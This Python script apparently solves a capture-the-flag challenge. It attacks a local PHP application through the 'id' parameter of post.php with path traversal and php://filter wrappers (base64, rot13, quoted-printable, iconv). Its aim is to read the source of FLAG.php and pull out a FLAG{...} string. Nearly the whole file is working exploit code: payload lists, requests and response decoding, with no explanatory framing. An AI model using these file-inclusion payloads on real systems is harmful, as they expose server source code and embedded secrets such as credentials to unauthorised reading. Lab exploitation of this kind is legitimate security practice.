import requests
import re
import base64

base_url = "http://127.0.0.1:32965/post.php"

print("=" * 60)
print("EXTRACTING FLAG.PHP SOURCE CODE")
print("=" * 60)

# Method 1: Try to get FLAG.php with base64 filter to see source
print("\n[1] Using php://filter to read FLAG.php source...")

payloads = [
    "php://filter/convert.base64-encode/resource=../../../../../../FLAG.php",
    "php://filter/read=convert.base64-encode/resource=../../../../../../FLAG.php",
    "php://filter/convert.base64-encode/resource=/FLAG.php",
]

for payload in payloads:
    url = f"{base_url}?id={payload}"
    resp = requests.get(url, timeout=10)
    print(f"\n[TEST] Payload: {payload}")
    print(f"[STATUS] {resp.status_code} | Length: {len(resp.text)} bytes")
    
    # Look for base64 content
    b64_match = re.search(r'([A-Za-z0-9+/]{100,}={0,2})', resp.text, re.DOTALL)
    if b64_match:
        print(f"[+] Found base64 content (length: {len(b64_match.group(1))})")
        try:
            decoded = base64.b64decode(b64_match.group(1)).decode('utf-8', errors='ignore')
            print("[+] DECODED CONTENT:")
            print("=" * 60)
            print(decoded)
            print("=" * 60)
            
            # Look for FLAG patterns
            flag_pattern = re.search(r'FLAG\{[^}]+\}', decoded)
            if flag_pattern:
                print(f"\n[!!!] FLAG FOUND: {flag_pattern.group(0)}")
        except Exception as e:
            print(f"[ERROR] Decoding failed: {e}")

# Method 2: Try different path depths
print("\n" + "=" * 60)
print("[2] Testing different path depths for FLAG.php...")
print("=" * 60)

depths = [
    "php://filter/convert.base64-encode/resource=../../../FLAG.php",
    "php://filter/convert.base64-encode/resource=../../../../FLAG.php",
    "php://filter/convert.base64-encode/resource=../../../../../FLAG.php",
    "php://filter/convert.base64-encode/resource=../../../../../../FLAG.php",
    "php://filter/convert.base64-encode/resource=../../../../../../../FLAG.php",
]

for payload in depths:
    url = f"{base_url}?id={payload}"
    resp = requests.get(url, timeout=10)
    
    b64_match = re.search(r'([A-Za-z0-9+/]{100,}={0,2})', resp.text, re.DOTALL)
    if b64_match:
        print(f"\n[+] Path worked: {payload}")
        try:
            decoded = base64.b64decode(b64_match.group(1)).decode('utf-8', errors='ignore')
            if "FLAG" in decoded or "flag" in decoded.lower():
                print("[CONTENT]:")
                print(decoded)
                flag_pattern = re.search(r'FLAG\{[^}]+\}', decoded)
                if flag_pattern:
                    print(f"\n[!!!] FLAG: {flag_pattern.group(0)}")
        except:
            pass

# Method 3: Check if the direct request gives us any rendered output
print("\n" + "=" * 60)
print("[3] Direct request to FLAG.php...")
print("=" * 60)

url = f"{base_url}?id=../../../../../../FLAG.php"
resp = requests.get(url, timeout=10)
print(f"[STATUS] {resp.status_code} | Length: {len(resp.text)} bytes")
print(f"[RESPONSE BODY]:")
print(repr(resp.text))

# The response should be empty if FLAG.php just defines a variable
# But let me check for any hidden content
if len(resp.text) > 0:
    # Check for HTML comments
    comments = re.findall(r'<!--(.*?)-->', resp.text, re.DOTALL)
    if comments:
        print("[+] HTML comments found:")
        for c in comments:
            print(f"  {c}")
    
    # Check for hidden elements  
    hidden = re.findall(r'<[^>]+hidden[^>]*>(.*?)</[^>]+>', resp.text, re.DOTALL)
    if hidden:
        print("[+] Hidden elements:")
        for h in hidden:
            print(f"  {h}")

# Method 4: Try to use different encoding filters
print("\n" + "=" * 60)
print("[4] Testing different PHP filters...")
print("=" * 60)

filters = [
    "php://filter/read=string.rot13/resource=../../../../../../FLAG.php",
    "php://filter/read=string.toupper/resource=../../../../../../FLAG.php",
    "php://filter/read=convert.quoted-printable-encode/resource=../../../../../../FLAG.php",
    "php://filter/convert.iconv.UTF-8.UTF-16/resource=../../../../../../FLAG.php",
]

for payload in filters:
    url = f"{base_url}?id={payload}"
    resp = requests.get(url, timeout=10)
    print(f"\n[TEST] {payload[:60]}...")
    print(f"[STATUS] {resp.status_code} | Length: {len(resp.text)} bytes")
    
    if len(resp.text) != 5326 and len(resp.text) > 0:  # Not "Post not found"
        # Check if it's rot13
        if "rot13" in payload:
            try:
                import codecs
                decoded = codecs.decode(resp.text[:1000], 'rot_13')
                print(f"[ROT13 DECODED] {decoded[:500]}")
            except:
                pass
        else:
            print(f"[CONTENT SAMPLE] {resp.text[:500]}")

print("\n" + "=" * 60)
print("EXTRACTION ATTEMPTS COMPLETE")
print("=" * 60)

